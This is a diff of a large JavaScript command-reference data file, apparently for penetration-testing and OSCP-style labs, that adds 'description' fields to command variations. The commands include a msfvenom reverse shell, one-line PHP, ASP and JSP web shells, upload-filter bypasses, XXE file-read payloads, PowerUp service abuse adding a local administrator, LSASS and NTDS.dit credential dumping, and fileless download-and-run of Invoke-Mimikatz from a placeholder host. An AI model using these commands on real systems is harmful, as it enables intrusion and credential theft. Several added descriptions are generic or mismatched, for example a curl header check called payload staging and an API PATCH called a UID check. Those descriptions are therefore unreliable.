-          "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f aspx -o shell.aspx"
+          "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f aspx -o shell.aspx",
+          "description": "Generates a Windows reverse shell payload with msfvenom. Creates an executable or shellcode that connects back to your listener when run on the target."
         }
       ],
       "steps": [
@@ -156972,11 +157960,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "PHP (echo test)",
-          "command": "<?php system('hostname'); ?>"
+          "command": "<?php system('hostname'); ?>",
+          "description": "Web shell payload that executes operating system commands through a web request. Provides command execution on the web server via a simple HTTP parameter."
         },
         {
           "label": "ASP.NET",
-          "command": "<% eval request('cmd') %>"
+          "command": "<% eval request('cmd') %>",
+          "description": "ASP.NET web shell that executes OS commands through a web request. Uses the .aspx extension for IIS servers running the .NET framework."
         }
       ],
       "opsec": "loud",
@@ -157201,11 +158191,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Reverse double ext",
-          "command": "shell.php.jpg"
+          "command": "shell.php.jpg",
+          "description": "File upload bypass technique using double extensions, null bytes, or alternative PHP extensions. Tricks the upload filter into accepting a PHP web shell as an image file."
         },
         {
           "label": "Null-byte inject",
-          "command": "shell.php%00.jpg"
+          "command": "shell.php%00.jpg",
+          "description": "File upload bypass technique using double extensions, null bytes, or alternative PHP extensions. Tricks the upload filter into accepting a PHP web shell as an image file."
         }
       ],
       "opsec": "loud",
@@ -157625,11 +158617,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "PHP source disclosure (php://filter base64)",
-          "command": "<!DOCTYPE svg [ <!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\"> ]>\n<svg>&xxe;</svg>"
+          "command": "<!DOCTYPE svg [ <!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\"> ]>\n<svg>&xxe;</svg>",
+          "description": "PHP source disclosure (php://filter base64). See the command syntax for exact parameters and flags."
         },
         {
           "label": "Read flag, rendered in <text>",
-          "command": "<!DOCTYPE svg [ <!ENTITY xxe SYSTEM \"file:///flag.txt\"> ]>\n<svg xmlns=\"http://www.w3.org/2000/svg\"><text x=\"10\" y=\"20\">&xxe;</text></svg>"
+          "command": "<!DOCTYPE svg [ <!ENTITY xxe SYSTEM \"file:///flag.txt\"> ]>\n<svg xmlns=\"http://www.w3.org/2000/svg\"><text x=\"10\" y=\"20\">&xxe;</text></svg>",
+          "description": "Read flag, rendered in <text>. See the command syntax for exact parameters and flags."
         }
       ],
       "exam": "exam-ok",
@@ -158100,11 +159094,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Pick a specific format",
-          "command": "./username-anarchy --select-format first.last -i <names_file>"
+          "command": "./username-anarchy --select-format first.last -i <names_file>",
+          "description": "Generates username permutations from a name list. Creates variations (jsmith, j.smith, smithj, john.smith, etc.) for username enumeration and password spraying."
         },
         {
           "label": "Generate from a single name",
-          "command": "./username-anarchy Jane Doe"
+          "command": "./username-anarchy Jane Doe",
+          "description": "Generate from a single name. See the command syntax for exact parameters and flags."
         }
       ],
       "explain": "Generates corporate username permutations from real names:\n  ./username-anarchy       the generator\n  -i <names_file>          input file of first/last names\nProduces jdoe, john.doe, doe.john, etc.; feed the output to kerbrute or a spray to discover which username format the org actually uses. --select-format picks one scheme."
@@ -158284,7 +159280,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Common formats from first/last names",
-          "command": "python3 username-anarchy -i <names_file> > usernames.txt"
+          "command": "python3 username-anarchy -i <names_file> > usernames.txt",
+          "description": "Common formats from first/last names. See the command syntax for exact parameters and flags."
         }
       ],
       "steps": [
@@ -158905,19 +159902,23 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Faster - increase threads",
-          "command": "gobuster vhost -u http://<ip> -w <wordlist> --append-domain -t 50"
+          "command": "gobuster vhost -u http://<ip> -w <wordlist> --append-domain -t 50",
+          "description": "Brute-forces virtual hostnames on a web server using gobuster. Discovers additional websites hosted on the same IP address."
         },
         {
           "label": "Ignore SSL/TLS cert errors (labs with self-signed certs)",
-          "command": "gobuster vhost -u https://<ip> -w <wordlist> --append-domain -k"
+          "command": "gobuster vhost -u https://<ip> -w <wordlist> --append-domain -k",
+          "description": "Ignore SSL/TLS cert errors (labs with self-signed certs). See the command syntax for exact parameters and flags."
         },
         {
           "label": "Save output to file",
-          "command": "gobuster vhost -u http://<ip> -w <wordlist> --append-domain -o vhosts.txt"
+          "command": "gobuster vhost -u http://<ip> -w <wordlist> --append-domain -o vhosts.txt",
+          "description": "Brute-forces virtual hostnames on a web server using gobuster. Discovers additional websites hosted on the same IP address."
         },
         {
           "label": "Combined - threads + ignore SSL + save",
-          "command": "gobuster vhost -u https://<ip> -w <wordlist> --append-domain -t 50 -k -o vhosts.txt"
+          "command": "gobuster vhost -u https://<ip> -w <wordlist> --append-domain -t 50 -k -o vhosts.txt",
+          "description": "Combined - threads + ignore SSL + save. See the command syntax for exact parameters and flags."
         }
       ],
       "explain": "Brute-forces the HTTP Host header to find virtual hosts served from one IP:\n  gobuster vhost   virtual-host discovery mode\n  -u http://<ip>   the target IP/base URL\n  -w <wordlist>    host names to try in the Host header\n  --append-domain  append the base domain to each word (word.domain)\nDifferent Host values can serve entirely different sites; add -k for HTTPS with invalid certs and -o to save hits."
@@ -159076,9 +160077,9 @@ const COMMAND_DATA = {
       },
       "variations": [
         {
-          "description": "Install vnstat",
           "command": "sudo apt install vnstat",
-          "label": "Install vnstat"
+          "label": "Install vnstat",
+          "description": "Runs a command with elevated (root) privileges via sudo. Leverages sudo permissions identified from the sudo -l enumeration."
         },
         {
           "description": "Monitor live bandwidth on interface",
@@ -159147,7 +160148,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Check adapter",
-          "command": "ifconfig"
+          "command": "ifconfig",
+          "description": "Shows network interface configuration including IP addresses, subnets, and additional network segments. Identifies dual-homed hosts for pivoting to other networks."
         },
         {
           "description": "Connect with a named .ovpn file (OSCP lab style)",
@@ -159640,22 +160642,26 @@ const COMMAND_DATA = {
         {
           "command": "wafw00f https://<target> -a",
           "caption": "Test against all known WAF signatures (thorough)",
-          "label": "wafw00f https://<target> -a"
+          "label": "wafw00f https://<target> -a",
+          "description": "Wafw00f https://<target> -a. See the command syntax for exact parameters and flags."
         },
         {
           "command": "wafw00f https://<target> -v",
           "caption": "Verbose output - shows each probe and response",
-          "label": "wafw00f https://<target> -v"
+          "label": "wafw00f https://<target> -v",
+          "description": "Wafw00f https://<target> -v. See the command syntax for exact parameters and flags."
         },
         {
           "command": "wafw00f https://<target> -o output.json -f json",
           "caption": "Save results to JSON",
-          "label": "JSON output"
+          "label": "JSON output",
+          "description": "Detects Web Application Firewalls (WAFs) protecting the target site. Identifying the WAF type helps choose appropriate evasion techniques for bypassing it."
         },
         {
           "command": "pip3 install wafw00f",
           "caption": "Install wafw00f",
-          "label": "pip3"
+          "label": "pip3",
+          "description": "Detects Web Application Firewalls (WAFs) protecting the target site. Identifying the WAF type helps choose appropriate evasion techniques for bypassing it."
         }
       ],
       "examples": [
@@ -160013,7 +161019,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "PowerUp",
-          "command": "Invoke-ServiceAbuse -Name '<service>' -UserName '<domain>\\<user>'"
+          "command": "Invoke-ServiceAbuse -Name '<service>' -UserName '<domain>\\<user>'",
+          "description": "Exploits a vulnerable Windows service using PowerUp. Replaces the service binary or modifies its configuration to execute a payload as SYSTEM when the service restarts."
         }
       ],
       "steps": [
@@ -160245,15 +161252,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "PowerUp auto-abuse",
-          "command": "Invoke-ServiceAbuse -Name '<service>' -Command 'net localgroup administrators <user> /add'"
+          "command": "Invoke-ServiceAbuse -Name '<service>' -Command 'net localgroup administrators <user> /add'",
+          "description": "Exploits a vulnerable Windows service using PowerUp. Replaces the service binary or modifies its configuration to execute a payload as SYSTEM when the service restarts."
         },
         {
           "label": "PowerUp writable-path check (OSCP PEN-200 Ch16)",
-          "command": "Get-ModifiablePath -Path <service_binary_or_dir>   # PowerUp: test if current user can write the path"
+          "command": "Get-ModifiablePath -Path <service_binary_or_dir>   # PowerUp: test if current user can write the path",
+          "description": "PowerUp writable-path check (OSCP PEN-200 Ch16). See the command syntax for exact parameters and flags."
         },
         {
           "label": "PowerUp binary replace (OSCP PEN-200 Ch16)",
-          "command": "Install-ServiceBinary -Name '<service>'   # PowerUp: swap the service binary for one that adds a local admin"
+          "command": "Install-ServiceBinary -Name '<service>'   # PowerUp: swap the service binary for one that adds a local admin",
+          "description": "PowerUp binary replace (OSCP PEN-200 Ch16). See the command syntax for exact parameters and flags."
         }
       ],
       "steps": [
@@ -160455,7 +161465,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Specific check",
-          "command": ".\\SharpUp.exe audit UnquotedServicePath"
+          "command": ".\\SharpUp.exe audit UnquotedServicePath",
+          "description": "Runs SharpUp for automated Windows privilege escalation checks. Identifies vulnerable services, registry autoruns, modifiable scheduled tasks, and other common privesc vectors."
         }
       ],
       "steps": [
@@ -160674,11 +161685,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Check writable autoruns (PowerUp)",
-          "command": "Get-ModifiableScheduledTaskFile -Verbose"
+          "command": "Get-ModifiableScheduledTaskFile -Verbose",
+          "description": "Check writable autoruns (PowerUp). See the command syntax for exact parameters and flags."
         },
         {
           "label": "Startup folder",
-          "command": "Get-ChildItem \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\""
+          "command": "Get-ChildItem \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\"",
+          "description": "Lists files and directories. Used for filesystem enumeration to find sensitive files, writable paths, and installed applications."
         }
       ],
       "explain": "Lists autostart programs to find a writable one that runs at another user's logon:\n  Get-CimInstance Win32_StartupCommand   enumerate autostart entries\n  | select Name, command, Location, User | fl   show each entry's command, where it is registered, and which user it runs for\nIf an entry or its target binary is writable by you, replace it with a payload that executes when a higher-privileged user logs in."
@@ -160882,15 +161895,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Find unquoted paths (WMIC)",
-          "command": "wmic service get name,pathname,startmode | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v '\\\"'"
+          "command": "wmic service get name,pathname,startmode | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v '\\\"'",
+          "description": "Find unquoted paths (WMIC). See the command syntax for exact parameters and flags."
         },
         {
           "label": "PowerUp",
-          "command": "Get-ServiceUnquoted -Verbose"
+          "command": "Get-ServiceUnquoted -Verbose",
+          "description": "Lists Windows services and their status. Identifies interesting services, unquoted service paths, weak service permissions, and services running as high-privilege accounts."
         },
         {
           "label": "PowerUp alias (OSCP PEN-200 Ch16)",
-          "command": "Get-UnquotedService   # renamed alias of Get-ServiceUnquoted in newer PowerUp"
+          "command": "Get-UnquotedService   # renamed alias of Get-ServiceUnquoted in newer PowerUp",
+          "description": "Lists Windows services and their status. Identifies interesting services, unquoted service paths, weak service permissions, and services running as high-privilege accounts."
         }
       ],
       "steps": [
@@ -161086,7 +162102,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Check service reg key ACL",
-          "command": "Get-Acl HKLM:\\System\\CurrentControlSet\\Services\\<service> | fl"
+          "command": "Get-Acl HKLM:\\System\\CurrentControlSet\\Services\\<service> | fl",
+          "description": "Reads the access control list (ACL) of a file, directory, or registry key. Shows who has what permissions on the target object for identifying weak file/folder permissions."
         }
       ],
       "steps": [
@@ -161267,15 +162284,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "waybackurls",
-          "command": "waybackurls <domain> | sort -u"
+          "command": "waybackurls <domain> | sort -u",
+          "description": "Retrieves historical URLs for a domain from the Wayback Machine archive. Discovers old endpoints, forgotten pages, and removed content that may still be accessible."
         },
         {
           "label": "gau (GetAllURLs, incl. subdomains)",
-          "command": "gau --subs <domain>"
+          "command": "gau --subs <domain>",
+          "description": "Gau (GetAllURLs, incl. subdomains). See the command syntax for exact parameters and flags."
         },
         {
           "label": "Wayback CDX API",
-          "command": "curl -s \"http://web.archive.org/cdx/search/cdx?url=*.<domain>/*&output=text&fl=original&collapse=urlkey\""
+          "command": "curl -s \"http://web.archive.org/cdx/search/cdx?url=*.<domain>/*&output=text&fl=original&collapse=urlkey\"",
+          "description": "Downloads a file or script from a remote URL. Used for staging tools, payloads, or second-stage code on the target."
         }
       ],
       "explain": "The Wayback Machine stores historical snapshots of a site - old pages, removed endpoints, and files that no longer exist live can reveal past vulnerabilities or hidden paths.\nThe Wayback Machine (web.archive.org) reveals old endpoints, removed pages, and dev artifacts that still exist server-side."
@@ -161802,15 +162822,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Header banner grab",
-          "command": "curl -I https://<domain>.com"
+          "command": "curl -I https://<domain>.com",
+          "description": "Downloads a file or script from a remote URL. Used for staging tools, payloads, or second-stage code on the target."
         },
         {
           "label": "Detect a WAF",
-          "command": "wafw00f <domain>.com"
+          "command": "wafw00f <domain>.com",
+          "description": "Detects Web Application Firewalls (WAFs) protecting the target site. Identifying the WAF type helps choose appropriate evasion techniques for bypassing it."
         },
         {
           "label": "Nikto fingerprint scan",
-          "command": "nikto -h <domain>.com -Tuning b"
+          "command": "nikto -h <domain>.com -Tuning b",
+          "description": "Runs Nikto with specific scan tuning options to focus on particular vulnerability categories. Reduces noise by testing only relevant check types."
         }
       ],
       "opsec": "moderate",
@@ -162089,12 +163112,14 @@ const COMMAND_DATA = {
         {
           "command": "curl -s -X PATCH http://<target>/api/v1/<endpoint> -H \"Authorization: Bearer <jwt_token>\" -H \"Content-Type: application/json\" -d '{\"id\": \"<object_id>\", \"isExemptedFromMarketplaceFee\": 1}' | jq",
           "caption": "API BOPLA: PATCH with privileged field not exposed in UI (Broken Object Property Level Auth)",
-          "label": "PATCH request"
+          "label": "PATCH request",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         },
         {
           "command": "curl -s -X GET http://<target>/api/v1/<endpoint>/current-user -H \"Authorization: Bearer <jwt_token>\" | jq 'keys'",
           "caption": "Enumerate all response fields to discover mass-assignable properties",
-          "label": "GET request"
+          "label": "GET request",
+          "description": "Downloads a file or script from a remote URL. Used for staging tools, payloads, or second-stage code on the target."
         }
       ],
       "defense": {
@@ -162872,7 +163897,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Metasploit PROXIES",
-          "command": "set PROXIES HTTP:127.0.0.1:8080"
+          "command": "set PROXIES HTTP:127.0.0.1:8080",
+          "description": "Metasploit PROXIES. See the command syntax for exact usage and parameters."
         },
         {
           "label": "curl native proxy flag (no proxychains needed)",
@@ -163068,15 +164094,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Headers (curl)",
-          "command": "curl -IL https://www.<domain>.com"
+          "command": "curl -IL https://www.<domain>.com",
+          "description": "Downloads a file or script from a remote URL. Used for staging tools, payloads, or second-stage code on the target."
         },
         {
           "label": "Fingerprint one target",
-          "command": "whatweb <ip>"
+          "command": "whatweb <ip>",
+          "description": "Identifies web technologies, frameworks, and server versions using WhatWeb. Fingerprints the technology stack for targeted vulnerability research."
         },
         {
           "label": "Fingerprint a subnet",
-          "command": "whatweb --no-errors <cidr>"
+          "command": "whatweb --no-errors <cidr>",
+          "description": "Identifies web technologies, frameworks, and server versions using WhatWeb. Fingerprints the technology stack for targeted vulnerability research."
         }
       ],
       "opsec": "moderate",
@@ -163257,11 +164286,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "JSP",
-          "command": "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"
+          "command": "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
+          "description": "Web shell payload that executes operating system commands through a web request. Provides command execution on the web server via a simple HTTP parameter."
         },
         {
           "label": "ASP",
-          "command": "<% eval request(\"cmd\") %>"
+          "command": "<% eval request(\"cmd\") %>",
+          "description": "Classic ASP web shell that executes arbitrary commands passed via HTTP request parameters. One-line backdoor for IIS servers running Classic ASP."
         }
       ],
       "opsec": "loud",
@@ -163488,17 +164519,20 @@ const COMMAND_DATA = {
         {
           "command": "smbclient //<ip>/<share> -c 'put <local_file>'",
           "caption": "Upload file via smbclient (when SMB is available)",
-          "label": "smbclient - upload"
+          "label": "smbclient - upload",
+          "description": "Connects to an SMB share for interactive file transfer. Supports uploading payloads and downloading sensitive files from accessible shares."
         },
         {
           "command": "smbclient //<ip>/<share> -c 'get <remote_file>'",
           "caption": "Download file via smbclient",
-          "label": "smbclient - download"
+          "label": "smbclient - download",
+          "description": "Connects to an SMB share for interactive file transfer. Supports uploading payloads and downloading sensitive files from accessible shares."
         },
         {
           "command": "smbclient //<ip>/<share> -U <user>%<pass> -c 'put <file>'",
           "caption": "Authenticated smbclient upload",
-          "label": "smbclient - upload (with creds)"
+          "label": "smbclient - upload (with creds)",
+          "description": "Smbclient - upload (with creds). See the command syntax for exact parameters and flags."
         }
       ],
       "defense": {
@@ -164446,11 +165480,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Privileged users",
-          "command": "python3 windapsearch.py --dc-ip <dc_ip> -u <user>@<domain> -p <password> --privileged-users"
+          "command": "python3 windapsearch.py --dc-ip <dc_ip> -u <user>@<domain> -p <password> --privileged-users",
+          "description": "Runs a Python-based tool or script for exploitation, enumeration, or post-exploitation activities."
         },
         {
           "label": "Computers",
-          "command": "python3 windapsearch.py --dc-ip <dc_ip> -u <user>@<domain> -p <password> -C"
+          "command": "python3 windapsearch.py --dc-ip <dc_ip> -u <user>@<domain> -p <password> -C",
+          "description": "Runs a Python-based tool or script for exploitation, enumeration, or post-exploitation activities."
         }
       ],
       "explain": "Runs common LDAP queries against a DC with windapsearch:\n  --dc-ip <dc_ip>        the DC to query\n  -u <user>@<domain> -p <password>   authenticate\n  --da                   enumerate Domain Admins group members\nA friendlier front-end to ldapsearch for frequent tasks; swap --da for -U (all users) or --PU (privileged users), and it also supports anonymous binds."
@@ -164668,7 +165704,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Parse offline with secretsdump",
-          "command": "impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL"
+          "command": "impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL",
+          "description": "Uses Impacket secretsdump to dump local SAM database hashes. Extracts password hashes for local accounts from the target machine."
         }
       ],
       "explain": "Saves the registry hives needed to extract local secrets offline:\n  reg.exe save hklm\\sam C:\\sam.save   export the SAM hive (local password hashes)\nAlso save SYSTEM (holds the boot key that decrypts SAM) and SECURITY (LSA secrets + cached domain creds). Exfil all three, then impacket-secretsdump -sam -system -security LOCAL recovers the hashes. Requires an elevated prompt."
@@ -164910,11 +165947,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "vshadow alternative",
-          "command": "vshadow.exe -nw -p C:"
+          "command": "vshadow.exe -nw -p C:",
+          "description": "Creates a Volume Shadow Copy to access locked files like NTDS.dit. Shadow copies allow reading the database file while Active Directory is running."
         },
         {
           "label": "ntdsutil IFM",
-          "command": "ntdsutil \"ac i ntds\" \"ifm\" \"create full C:\\temp\" q q"
+          "command": "ntdsutil \"ac i ntds\" \"ifm\" \"create full C:\\temp\" q q",
+          "description": "Uses ntdsutil to create an IFM (Install From Media) backup containing NTDS.dit and SYSTEM hive. Extracts the AD database for offline password hash extraction."
         }
       ],
       "explain": "Extracts the AD database from a DC by snapshotting the locked volume:\n  vssadmin CREATE SHADOW /For=C:   make a Volume Shadow Copy so NTDS.dit can be read despite the AD lock\nThen copy NTDS.dit out of the \\\\?\\GLOBALROOT snapshot and reg save the SYSTEM hive (for the boot key), and run impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL to dump every domain account's NT hash. ntdsutil IFM is the built-in alternative."
@@ -164991,15 +166030,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Registry hives",
-          "command": "HKLM\\SAM      - Local user password hashes\nHKLM\\SYSTEM   - System boot key (required to decrypt SAM)\nHKLM\\SECURITY - LSA secrets, cached domain creds (DCC2), DPAPI keys"
+          "command": "HKLM\\SAM      - Local user password hashes\nHKLM\\SYSTEM   - System boot key (required to decrypt SAM)\nHKLM\\SECURITY - LSA secrets, cached domain creds (DCC2), DPAPI keys",
+          "description": "Saves the SAM and SYSTEM registry hives for offline hash extraction. These files contain the local account password hashes when parsed together."
         },
         {
           "label": "Hash formats",
-          "command": "# SAM dump line:\nuid:rid:lmhash:nthash\n# DCC2 (cached domain) format:\n<domain>/Administrator:$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25"
+          "command": "# SAM dump line:\nuid:rid:lmhash:nthash\n# DCC2 (cached domain) format:\n<domain>/Administrator:$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         },
         {
           "label": "DPAPI-protected apps",
-          "command": "Internet Explorer  - Saved site credentials\nGoogle Chrome      - Saved site credentials\nOutlook            - Email account passwords\nRemote Desktop     - Saved RDP credentials\nCredential Manager - Network shares, Wi-Fi, VPN credentials"
+          "command": "Internet Explorer  - Saved site credentials\nGoogle Chrome      - Saved site credentials\nOutlook            - Email account passwords\nRemote Desktop     - Saved RDP credentials\nCredential Manager - Network shares, Wi-Fi, VPN credentials",
+          "description": "Reference list of applications that store credentials protected by Windows DPAPI. If you can access the user's DPAPI master key, these credentials can be decrypted using tools like Mimikatz or SharpDPAPI."
         }
       ],
       "opsec": "loud",
@@ -165233,11 +166275,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "nanodump (evasive)",
-          "command": "nanodump.exe --write C:\\lsass.dmp"
+          "command": "nanodump.exe --write C:\\lsass.dmp",
+          "description": "Dumps LSASS memory using nanodump, which creates a minidump with system call evasion techniques. Harder for EDR to detect than standard Mimikatz or ProcDump-based approaches."
         },
         {
           "label": "Task Manager (GUI: right-click lsass -> Create dump file)",
-          "command": "# %temp%\\lsass.DMP"
+          "command": "# %temp%\\lsass.DMP",
+          "description": "Task Manager (GUI: right-click lsass -> Create dump file). See the command syntax for exact parameters and flags."
         }
       ],
       "explain": "Dumps LSASS memory with a signed LOLBIN so credentials can be parsed offline:\n  rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump   call comsvcs MiniDump export\n  <lsass_pid>              the LSASS process id (from tasklist /svc or Get-Process lsass)\n  C:\\lsass.dmp             output dump path\n  full                     capture the full process memory\nRequires local admin/SeDebug. Exfil the dump and parse with pypykatz (no Mimikatz on the target) to recover NT hashes and tickets."
@@ -165279,11 +166323,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Check if TelnetClient is already installed",
-          "command": "dism /online /Get-Features | findstr /i telnet"
+          "command": "dism /online /Get-Features | findstr /i telnet",
+          "description": "Check if TelnetClient is already installed. See the command syntax for exact parameters and flags."
         },
         {
           "label": "Enable via PowerShell (alternative)",
-          "command": "Enable-WindowsOptionalFeature -Online -FeatureName TelnetClient"
+          "command": "Enable-WindowsOptionalFeature -Online -FeatureName TelnetClient",
+          "description": "Enable via PowerShell (alternative). See the command syntax for exact parameters and flags."
         }
       ],
       "examples": [
@@ -165624,11 +166670,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Run a process as the saved user",
-          "command": "runas /savecred /user:<domain>\\<user> \"cmd /c <command>\""
+          "command": "runas /savecred /user:<domain>\\<user> \"cmd /c <command>\"",
+          "description": "Run a process as the saved user. See the command syntax for exact parameters and flags."
         },
         {
           "label": "Also check DPAPI vault",
-          "command": "vaultcmd /listcreds:\"Windows Credentials\" /all"
+          "command": "vaultcmd /listcreds:\"Windows Credentials\" /all",
+          "description": "Queries the Windows Credential Vault for stored credentials. The vault stores web passwords, Windows credentials, and certificate-based credentials."
         }
       ],
       "steps": [
@@ -165709,19 +166757,23 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "PowerShell FTP download",
-          "command": "(New-Object Net.WebClient).DownloadFile('ftp://<lhost>/file.txt','C:\\Users\\Public\\ftp-file.txt')"
+          "command": "(New-Object Net.WebClient).DownloadFile('ftp://<lhost>/file.txt','C:\\Users\\Public\\ftp-file.txt')",
+          "description": "Downloads a file or script from a remote URL. Used for staging tools, payloads, or second-stage code on the target."
         },
         {
           "label": "PowerShell FTP upload",
-          "command": "(New-Object Net.WebClient).UploadFile('ftp://<lhost>/ftp-hosts','C:\\Windows\\System32\\drivers\\etc\\hosts')"
+          "command": "(New-Object Net.WebClient).UploadFile('ftp://<lhost>/ftp-hosts','C:\\Windows\\System32\\drivers\\etc\\hosts')",
+          "description": "Reads the hosts file for custom hostname-to-IP mappings. Reveals internal hostnames, development servers, and network topology that DNS queries might not show."
         },
         {
           "label": "ftp.exe script - download",
-          "command": "echo open <lhost> > ftpcommand.txt\necho USER anonymous >> ftpcommand.txt\necho binary >> ftpcommand.txt\necho GET file.txt >> ftpcommand.txt\necho bye >> ftpcommand.txt\nftp -v -n -s:ftpcommand.txt"
+          "command": "echo open <lhost> > ftpcommand.txt\necho USER anonymous >> ftpcommand.txt\necho binary >> ftpcommand.txt\necho GET file.txt >> ftpcommand.txt\necho bye >> ftpcommand.txt\nftp -v -n -s:ftpcommand.txt",
+          "description": "Writes text to a file or stdout for various post-exploitation purposes (persistence, payload deployment, or file manipulation)."
         },
         {
           "label": "ftp.exe script - upload",
-          "command": "echo open <lhost> > ftpcommand.txt\necho USER anonymous >> ftpcommand.txt\necho binary >> ftpcommand.txt\necho PUT c:\\windows\\system32\\drivers\\etc\\hosts >> ftpcommand.txt\necho bye >> ftpcommand.txt\nftp -v -n -s:ftpcommand.txt"
+          "command": "echo open <lhost> > ftpcommand.txt\necho USER anonymous >> ftpcommand.txt\necho binary >> ftpcommand.txt\necho PUT c:\\windows\\system32\\drivers\\etc\\hosts >> ftpcommand.txt\necho bye >> ftpcommand.txt\nftp -v -n -s:ftpcommand.txt",
+          "description": "Writes text to a file or stdout for various post-exploitation purposes (persistence, payload deployment, or file manipulation)."
         }
       ],
       "opsec": "quiet",
@@ -165894,11 +166946,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "List all hosts visible on local network",
-          "command": "net view"
+          "command": "net view",
+          "description": "Discovers other computers and shares on the network. Lists domain machines and their shared resources - basic network reconnaissance from a Windows host."
         },
         {
           "label": "List hosts in a specific domain/workgroup",
-          "command": "net view /domain:<domain>"
+          "command": "net view /domain:<domain>",
+          "description": "Discovers other computers and shares on the network. Lists domain machines and their shared resources - basic network reconnaissance from a Windows host."
         }
       ],
       "examples": [
@@ -166345,27 +167399,33 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "WebClient DownloadFile",
-          "command": "(New-Object Net.WebClient).DownloadFile('https://<ip>/PowerView.ps1','C:\\Users\\Public\\Downloads\\PowerView.ps1')"
+          "command": "(New-Object Net.WebClient).DownloadFile('https://<ip>/PowerView.ps1','C:\\Users\\Public\\Downloads\\PowerView.ps1')",
+          "description": "Downloads a file or script from a remote URL. Used for staging tools, payloads, or second-stage code on the target."
         },
         {
           "label": "WebClient async",
-          "command": "(New-Object Net.WebClient).DownloadFileAsync('https://<ip>/PowerView.ps1','C:\\Users\\Public\\Downloads\\PowerViewAsync.ps1')"
+          "command": "(New-Object Net.WebClient).DownloadFileAsync('https://<ip>/PowerView.ps1','C:\\Users\\Public\\Downloads\\PowerViewAsync.ps1')",
+          "description": "Downloads a file or script from a remote URL. Used for staging tools, payloads, or second-stage code on the target."
         },
         {
           "label": "Invoke-WebRequest -OutFile",
-          "command": "Invoke-WebRequest https://<ip>/PowerView.ps1 -OutFile PowerView.ps1"
+          "command": "Invoke-WebRequest https://<ip>/PowerView.ps1 -OutFile PowerView.ps1",
+          "description": "Downloads a file from a URL using PowerShell Invoke-WebRequest. Used to stage tools, payloads, or scripts on the target machine."
         },
         {
           "label": "Fileless (DownloadString | IEX)",
-          "command": "IEX (New-Object Net.WebClient).DownloadString('https://<ip>/Invoke-Mimikatz.ps1')\n# or: (New-Object Net.WebClient).DownloadString('https://<ip>/x.ps1') | IEX"
+          "command": "IEX (New-Object Net.WebClient).DownloadString('https://<ip>/Invoke-Mimikatz.ps1')\n# or: (New-Object Net.WebClient).DownloadString('https://<ip>/x.ps1') | IEX",
+          "description": "Downloads and executes a PowerShell script directly in memory without writing to disk. Common initial access and tool staging technique - bypasses disk-based AV scanning."
         },
         {
           "label": "Fileless via IWR",
-          "command": "Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX"
+          "command": "Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX",
+          "description": "Downloads and executes a PowerShell script directly in memory without writing to disk. Common initial access and tool staging technique - bypasses disk-based AV scanning."
         },
         {
           "label": "SSL bypass (self-signed cert)",
-          "command": "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}\nInvoke-WebRequest https://<ip>/PowerView.ps1 -OutFile PowerView.ps1"
+          "command": "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}\nInvoke-WebRequest https://<ip>/PowerView.ps1 -OutFile PowerView.ps1",
+          "description": "Downloads a file from a URL using PowerShell Invoke-WebRequest. Used to stage tools, payloads, or scripts on the target machine."
         }
       ],
       "opsec": "quiet",
@@ -166557,22 +167617,26 @@ const COMMAND_DATA = {
         {
           "command": "Get-ChildItem -Path C:\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue",
           "caption": "Hunt for KeePass databases",
-          "label": "Find KeePass DBs (.kdbx)"
